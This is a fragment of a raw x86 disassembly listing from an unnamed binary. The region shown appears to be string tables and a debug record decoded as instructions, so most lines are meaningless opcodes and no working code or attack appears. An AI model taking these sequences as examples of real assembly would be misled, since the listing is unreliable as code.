  4335b2:	add    BYTE PTR ds:0x9700104f,al
  4335b8:	xor    eax,0x359b0043
  4335bd:	inc    ebx
  4335be:	add    BYTE PTR [edi-0x5cffbccb],bl
  4335c4:	xor    eax,0x35a70043
  4335c9:	inc    ebx
  4335ca:	add    BYTE PTR [ebx-0x50ffbccb],ch
  4335d0:	xor    eax,0x35b30043
  4335d5:	inc    ebx
  4335d6:	add    BYTE PTR [ecx],al
  4335d8:	add    BYTE PTR [eax],dl
  4335da:	add    al,ah
  4335dc:	pop    ebp
  4335dd:	adc    BYTE PTR [eax],al
  4335df:	add    ah,BYTE PTR ds:0x328d0010
  4335e5:	adc    BYTE PTR [eax],al
  4335e7:	xchg   DWORD PTR [ecx],edx
  4335e9:	adc    BYTE PTR [eax],al
  4335eb:	ja     0x4335f9
  4335ed:	adc    BYTE PTR [eax],al
  4335ef:	add    cl,BYTE PTR [eax]
  4335f1:	adc    BYTE PTR [eax],al
  4335f3:	jle    0x433669
  4335f5:	adc    BYTE PTR [eax],al
  4335f7:	xlat   BYTE PTR ds:[ebx]
  4335f8:	xor    eax,0x35db0043
  4335fd:	inc    ebx
  4335fe:	add    bh,bl
  433600:	xor    eax,0x35e30043
  433605:	inc    ebx
  433606:	add    bh,ah
  433608:	xor    eax,0x35eb0043
  43360d:	inc    ebx
  43360e:	add    bh,ch
  433610:	xor    eax,0x35f30043
  433615:	inc    ebx
  433616:	add    BYTE PTR [esi+0x12],bl
  433619:	adc    BYTE PTR [eax],al
  43361b:	stc    
  43361c:	push   es
  43361d:	adc    BYTE PTR [eax],al
  43361f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433620:	xor    DWORD PTR [eax],edx
  433622:	add    BYTE PTR [eax+0x7b],dl
  433625:	adc    BYTE PTR [eax],al
  433627:	stos   DWORD PTR es:[edi],eax
  433628:	push   edi
  433629:	adc    BYTE PTR [eax],al
  43362b:	inc    ebp
  43362c:	adc    edx,DWORD PTR [eax]
  43362e:	add    BYTE PTR [eax+0x38],ch
  433631:	adc    BYTE PTR [eax],al
  433633:	pop    ecx
  433634:	and    edx,DWORD PTR [eax]
  433636:	add    BYTE PTR [edi],dl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [ebx],bl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [edi],bl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [ebx],ah
  433644:	ss inc ebx
  433646:	add    BYTE PTR [edi],ah
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [ebx],ch
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [edi],ch
  433650:	ss inc ebx
  433652:	add    BYTE PTR [ebx],dh
  433654:	ss inc ebx
  433656:	add    BYTE PTR [ecx+0x72],cl
  433659:	adc    BYTE PTR [eax],al
  43365b:	cmp    edi,DWORD PTR [eax+0x10]
  43365e:	add    BYTE PTR [ebx+0x23],dl
  433661:	adc    BYTE PTR [eax],al
  433663:	jno    0x4336d1
  433665:	adc    BYTE PTR [eax],al
  433667:	pop    eax
  433668:	outs   dx,BYTE PTR ds:[esi]
  433669:	adc    BYTE PTR [eax],al
  43366b:	mov    ebx,DWORD PTR [ebx+0x10]
  43366e:	add    BYTE PTR [ebx+ebx*2],ch
  433671:	adc    BYTE PTR [eax],al
  433673:	retf   0x1066
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    BYTE PTR [ebx+0x36],dh
  433695:	inc    ebx
  433696:	add    BYTE PTR [ebx+0x32],al
  433699:	xor    dh,BYTE PTR ds:0x5a52345f
  43369f:	push   esp
  4336a0:	xor    BYTE PTR [esi],dh
  4336a2:	add    BYTE PTR [ecx+0x36],cl
  4336a5:	push   eax
  4336a6:	pop    edi
  4336a7:	ss inc ebx
  4336a9:	ss pop edx
  4336ab:	xor    ebx,DWORD PTR [edi+0x52]
  4336ae:	add    BYTE PTR [edi+ecx*2+0x32],dl
  4336b2:	pop    edi
  4336b3:	dec    esi
  4336b4:	dec    esp
  4336b5:	dec    eax
  4336b6:	xor    esi,DWORD PTR [edx]
  4336b8:	pop    edi
  4336b9:	xor    al,0x4b
  4336bb:	add    BYTE PTR [eax+0x49],cl
  4336be:	push   ebp
  4336bf:	xor    al,0x5f
  4336c1:	dec    esp
  4336c2:	inc    edx
  4336c3:	dec    ecx
  4336c4:	cmp    DWORD PTR [edi+ebx*2],esi
  4336c7:	pop    ecx
  4336c8:	inc    edi
  4336c9:	add    BYTE PTR [eax+0x50],bl
  4336cc:	dec    eax
  4336cd:	pop    edi
  4336ce:	push   ebp
  4336cf:	push   ecx
  4336d0:	inc    edi
  4336d1:	xor    cl,BYTE PTR [edx+0x38]
  4336d4:	push   esi
  4336d5:	add    BYTE PTR [ebx+0x4a],al
  4336d8:	push   edx
  4336d9:	pop    edi
  4336da:	dec    edi
  4336db:	dec    eax
  4336dc:	dec    edi
  4336dd:	dec    edi
  4336de:	dec    edx
  4336df:	add    BYTE PTR [ecx+0x52],al
  4336e2:	cmp    DWORD PTR [edi+0x56],ebx
  4336e5:	aaa    
  4336e6:	dec    esp
  4336e7:	cmp    DWORD PTR [ebx+0x5f],eax
  4336ea:	push   edx
  4336eb:	inc    esp
  4336ec:	add    BYTE PTR [ecx+0x37],bl
  4336ef:	inc    esp
  4336f0:	pop    edi
  4336f1:	dec    ecx
  4336f2:	xor    esi,DWORD PTR [edi]
  4336f4:	xor    DWORD PTR [edi+0x49],ebx
  4336f7:	push   esp
  4336f8:	xor    eax,DWORD PTR [eax]
  4336fa:	push   edx
  4336fb:	xor    BYTE PTR [eax+0x5f],bl
  4336fe:	dec    eax
  4336ff:	push   edi
  433700:	inc    esi
  433701:	xor    DWORD PTR [edi+0x5f],edx
  433704:	cmp    BYTE PTR [ebx+0x37],dl
  433707:	add    BYTE PTR [esi+0x42],dl
  43370a:	dec    ecx
  43370b:	xor    ebx,DWORD PTR [edi+0x45]
  43370e:	xor    BYTE PTR [ebp+0x5f],cl
  433711:	xor    al,0x34
  433713:	xor    BYTE PTR [edx+0x5f],cl
  433716:	inc    edi
  433717:	add    BYTE PTR [edx+0x57],dl
  43371a:	xor    ebx,DWORD PTR [edi+0x31]
  43371d:	dec    edx
  43371e:	push   edi
  43371f:	xor    eax,0x4d435f
  433724:	dec    ecx
  433725:	xor    eax,0x36365f39
  43372a:	dec    eax
  43372b:	xor    BYTE PTR [eax],al
  43372d:	dec    edi
  43372e:	inc    ebx
  43372f:	push   edi
  433730:	pop    edi
  433731:	inc    edi
  433732:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  433737:	add    BYTE PTR [edx+0x58],al
  43373a:	inc    edi
  43373b:	ss pop edi
  43373d:	push   esi
  43373e:	inc    ebx
  43373f:	dec    esi
  433740:	inc    esp
  433741:	add    BYTE PTR [edi+0x4d],cl
  433744:	inc    edi
  433745:	xor    ebx,DWORD PTR [edi+0x34]
  433748:	dec    esi
  433749:	pop    edx
  43374a:	cmp    BYTE PTR [edi+0x58],bl
  43374d:	cmp    BYTE PTR [eax],al
  43374f:	push   edx
  433750:	pop    eax
  433751:	push   ecx
  433752:	pop    edi
  433753:	dec    esp
  433754:	push   edx
  433755:	dec    ecx
  433756:	dec    edi
  433757:	inc    esp
  433758:	pop    edi
  433759:	dec    edi
  43375a:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43375e:	push   eax
  43375f:	inc    ebp
  433760:	pop    edi
  433761:	xor    eax,0x565f3945
  433766:	add    BYTE PTR [edi+0x4e],al
  433769:	push   esi
  43376a:	pop    edi
  43376b:	inc    edi
  43376c:	push   esp
  43376d:	dec    eax
  43376e:	xor    dh,BYTE PTR [ecx]
  433770:	pop    edi
  433771:	dec    edi
  433772:	xor    eax,DWORD PTR ss:[eax]
  433775:	inc    esp
  433776:	inc    ebp
  433777:	dec    ecx
  433778:	pop    edi
  433779:	push   edx
  43377a:	dec    eax
  43377b:	xor    al,0x48
  43377d:	dec    ecx
  43377e:	ss pop edi
  433780:	aaa    
  433781:	aaa    
  433782:	dec    ecx
  433783:	dec    ebp
  433784:	add    BYTE PTR [eax+0x54],cl
  433787:	ss pop edi
  433789:	inc    esi
  43378a:	inc    edx
  43378b:	xor    dh,BYTE PTR [eax+eax*1]
  43378e:	dec    esi
  43378f:	ss dec edx
  433791:	pop    edi
  433792:	dec    ecx
  433793:	dec    esp
  433794:	inc    edi
  433795:	inc    esp
  433796:	dec    eax
  433797:	xor    BYTE PTR [eax],bh
  433799:	xor    eax,0x4c344f00
  43379e:	xor    esi,DWORD PTR [edi]
  4337a0:	xor    BYTE PTR [edi+0x44],bl
  4337a3:	inc    edi
  4337a4:	dec    ebx
  4337a5:	xor    al,BYTE PTR [ecx+0x43]
  4337a8:	add    BYTE PTR [edi+0x32],cl
  4337ab:	xor    ebx,DWORD PTR [edi+0x57]
  4337ae:	xor    cl,BYTE PTR [edi+0x5f]
  4337b1:	pop    edx
  4337b2:	add    BYTE PTR [eax+0x4c],bl
  4337b5:	cmp    DWORD PTR [edi+0x4b],ebx
  4337b8:	inc    ecx
  4337b9:	dec    edx
  4337ba:	inc    esi
  4337bb:	xor    DWORD PTR [edi+ebx*2],esi
  4337be:	pop    eax
  4337bf:	inc    edi
  4337c0:	inc    edx
  4337c1:	add    BYTE PTR [eax+0x33],dl
  4337c4:	dec    esi
  4337c5:	pop    edi
  4337c6:	dec    eax
  4337c7:	xor    eax,0x485f53
  4337cc:	dec    ebp
  4337cd:	xor    BYTE PTR [edx+0x5f],al
  4337d0:	dec    edx
  4337d1:	pop    eax
  4337d2:	push   esp
  4337d3:	dec    ecx
  4337d4:	dec    esp
  4337d5:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  4337d9:	xor    esi,DWORD PTR [eax]
  4337db:	pop    edi
  4337dc:	inc    ecx
  4337dd:	pop    edx
  4337de:	push   ecx
  4337df:	pop    edx
  4337e0:	cmp    DWORD PTR [esi],esi
  4337e2:	pop    edi
  4337e3:	dec    eax
  4337e4:	dec    esp
  4337e5:	pop    edx
  4337e6:	add    BYTE PTR [ecx+0x57],dl
  4337e9:	pop    ecx
  4337ea:	pop    edi
  4337eb:	push   esi
  4337ec:	xor    al,0x44
  4337ee:	xor    DWORD PTR [eax],edi
  4337f0:	xor    bl,BYTE PTR [edi+0x39]
  4337f3:	push   esp
  4337f4:	push   esp
  4337f5:	add    BYTE PTR [esi+0x0],dl
  4337f8:	dec    edi
  4337f9:	add    BYTE PTR [edi+0x0],al
  4337fc:	add    BYTE PTR ss:[edi+0x0],bl
  433800:	dec    edi
  433801:	add    BYTE PTR [edx+0x0],bl
  433804:	inc    ebp
  433805:	add    BYTE PTR [eax],dh
  433807:	add    BYTE PTR [ebp+0x0],al
  43380a:	xor    BYTE PTR [eax],al
  43380c:	pop    edi
  43380d:	add    BYTE PTR [eax],dh
  43380f:	add    BYTE PTR ds:0x4f000000,dh
  433815:	add    BYTE PTR ds:0x5f005700,dh
  43381b:	add    BYTE PTR [edi],dh
  43381d:	add    BYTE PTR [ebx+0x0],dl
  433820:	push   ebp
  433821:	add    BYTE PTR [edi+0x0],al
  433824:	xor    al,0x0
  433826:	pop    edi
  433827:	add    BYTE PTR [ecx+0x0],dl
  43382a:	inc    esp
  43382b:	add    BYTE PTR [eax],al
  43382d:	add    BYTE PTR [edx+0x0],dl
  433830:	push   esp
  433831:	add    BYTE PTR ds:0x52005f00,dh
  433837:	add    BYTE PTR [edi+0x0],dl
  43383a:	xor    al,BYTE PTR [eax]
  43383c:	xor    al,BYTE PTR [eax]
  43383e:	xor    BYTE PTR [eax],al
  433840:	xor    BYTE PTR [eax],al
  433842:	pop    edi
  433843:	add    BYTE PTR [esi],dh
  433845:	add    BYTE PTR [eax],al
  433847:	add    BYTE PTR [eax+0x0],cl
  43384a:	inc    ebp
  43384b:	add    BYTE PTR [eax+eax*1+0x30],cl
  43384f:	add    BYTE PTR [edi+0x0],bl
  433852:	dec    edx
  433853:	add    BYTE PTR [edx],dh
  433855:	add    BYTE PTR [edi],dh
  433857:	add    BYTE PTR [ebp+0x0],dl
  43385a:	add    BYTE PTR ss:[eax],dh
  43385d:	add    BYTE PTR [eax],al
  43385f:	add    BYTE PTR [esi+0x0],dl
  433862:	cmp    BYTE PTR [eax],al
  433864:	dec    edi
  433865:	add    BYTE PTR [ecx],bh
  433867:	add    BYTE PTR [edi+0x0],bl
  43386a:	pop    eax
  43386b:	add    BYTE PTR [edx+0x0],bl
  43386e:	dec    esp
  43386f:	add    BYTE PTR [ebx+0x0],cl
  433872:	add    BYTE PTR [eax],al
  433874:	dec    ecx
  433875:	add    BYTE PTR [ebp+0x0],dl
  433878:	dec    edi
  433879:	add    BYTE PTR [eax],bh
  43387b:	add    BYTE PTR [edi+0x0],bl
  43387e:	inc    esp
  43387f:	add    BYTE PTR [eax],bh
  433881:	add    BYTE PTR [ecx+0x0],cl
  433884:	dec    eax
  433885:	add    BYTE PTR [edi+0x0],cl
  433888:	pop    edi
  433889:	add    BYTE PTR [ebp+0x0],al
  43388c:	pop    eax
  43388d:	add    BYTE PTR [eax],al
  43388f:	add    BYTE PTR [edx+0x0],dl
  433892:	dec    esp
  433893:	add    BYTE PTR [esi],dh
  433895:	add    BYTE PTR [edi+0x0],bl
  433898:	aaa    
  433899:	add    BYTE PTR [eax+0x0],bl
  43389c:	xor    eax,DWORD PTR [eax]
  43389e:	inc    edi
  43389f:	add    BYTE PTR [ecx+0x0],dl
  4338a2:	pop    edi
  4338a3:	add    BYTE PTR [edx+0x0],cl
  4338a6:	add    BYTE PTR [eax],al
  4338a8:	inc    edi
  4338a9:	add    BYTE PTR [edi+0x0],cl
  4338ac:	push   ebx
  4338ad:	add    BYTE PTR [eax+eax*1],dh
  4338b0:	pop    edi
  4338b1:	add    BYTE PTR [ecx+0x0],cl
  4338b4:	xor    DWORD PTR [eax],eax
  4338b6:	push   esi
  4338b7:	add    BYTE PTR [ebx],dh
  4338b9:	add    BYTE PTR [edi+0x0],bl
  4338bc:	dec    ecx
  4338bd:	add    BYTE PTR [edx+0x0],bl
  4338c0:	add    BYTE PTR [eax],al
  4338c2:	inc    ebx
  4338c3:	add    BYTE PTR [ecx+0x0],bl
  4338c6:	inc    ecx
  4338c7:	add    BYTE PTR [eax],dh
  4338c9:	add    BYTE PTR [ecx],bh
  4338cb:	add    BYTE PTR [edi+0x0],bl
  4338ce:	cmp    DWORD PTR [eax],eax
  4338d0:	push   eax
  4338d1:	add    BYTE PTR [eax+eax*1],dh
  4338d4:	pop    edx
  4338d5:	add    BYTE PTR [eax],al
  4338d7:	add    BYTE PTR [edx+0x0],al
  4338da:	inc    esi
  4338db:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4338df:	add    BYTE PTR [ebp+0x0],dl
  4338e2:	push   ebp
  4338e3:	add    BYTE PTR [eax+eax*1+0x57],dl
  4338e7:	add    BYTE PTR [eax],al
  4338e9:	add    BYTE PTR [eax+eax*1+0x37],dl
  4338ed:	add    BYTE PTR [eax+eax*1+0x38],dl
  4338f1:	add    BYTE PTR [edi+0x0],bl
  4338f4:	xor    eax,DWORD PTR [eax]
  4338f6:	cmp    DWORD PTR [eax],eax
  4338f8:	dec    eax
  4338f9:	add    BYTE PTR [edi+0x0],bl
  4338fc:	dec    ebp
  4338fd:	add    BYTE PTR [ecx+0x0],bl
  433900:	cmp    DWORD PTR [eax],eax
  433902:	inc    ecx
  433903:	add    BYTE PTR [esi+0x0],cl
  433906:	add    BYTE PTR [eax],al
  433908:	inc    ebx
  433909:	add    BYTE PTR [eax+0x0],dl
  43390c:	dec    esi
  43390d:	add    BYTE PTR [eax+eax*1],dh
  433910:	pop    edi
  433911:	add    BYTE PTR [eax+eax*1+0x54],cl
  433915:	add    BYTE PTR [ebx+0x0],cl
  433918:	xor    DWORD PTR [eax],eax
  43391a:	add    BYTE PTR [eax],al
  43391c:	inc    ecx
  43391d:	add    BYTE PTR [edi],dh
  43391f:	add    BYTE PTR [edx+0x0],cl
  433922:	pop    edi
  433923:	add    BYTE PTR [ebx+0x0],al
  433926:	cmp    BYTE PTR [eax],al
  433928:	push   edi
  433929:	add    BYTE PTR [eax+0x0],dl
  43392c:	pop    edi
  43392d:	add    BYTE PTR [eax+eax*1+0x4e],cl
  433931:	add    BYTE PTR [edx],dh
  433933:	add    BYTE PTR [eax],al
  433935:	add    BYTE PTR [edx+0x0],al
  433938:	add    BYTE PTR [eax],al
  43393a:	push   edx
  43393b:	push   ebx
  43393c:	inc    esp
  43393d:	push   ebx
  43393e:	mov    ds:0x534a1a87,eax
  433943:	lds    esi,FWORD PTR [ebx+0x5312bd48]
  433949:	scas   eax,DWORD PTR es:[edi]
  43394a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43394b:	mov    ss,WORD PTR [esi+0x71]
  43394e:	adc    eax,DWORD PTR [eax]
  433950:	add    BYTE PTR [eax],al
  433952:	dec    edi
  433953:	cmp    bl,BYTE PTR [ecx+esi*2+0x54]
  433957:	inc    esp
  433958:	jp     0x4339a8
  43395a:	jb     0x4339b6
  43395c:	addr16 jne 0x4339c2
  43395f:	jns    0x4339d1
  433961:	jbe    0x4339bf
  433963:	push   0x62
  433965:	push   edi
  433966:	jns    0x4339e0
  433968:	inc    ebp
  433969:	ins    DWORD PTR es:[edi],dx
  43396a:	jbe    0x4339d3
  43396c:	popa   
  43396d:	pop    esp
  43396e:	je     0x4339da
  433970:	pop    edx
  433971:	data16 jne 0x4339e6
  433974:	ja     0x4339de
  433976:	push   edx
  433977:	bound  eax,QWORD PTR [ebp+0x72]
  43397a:	pop    esp
  43397b:	dec    edx
  43397c:	jae    0x4339c2
  43397e:	ins    DWORD PTR es:[edi],dx
  43397f:	imul   ebp,DWORD PTR [eax+0x62],0x2e
  433983:	jo     0x4339e9
  433985:	bound  eax,QWORD PTR [eax]
	...
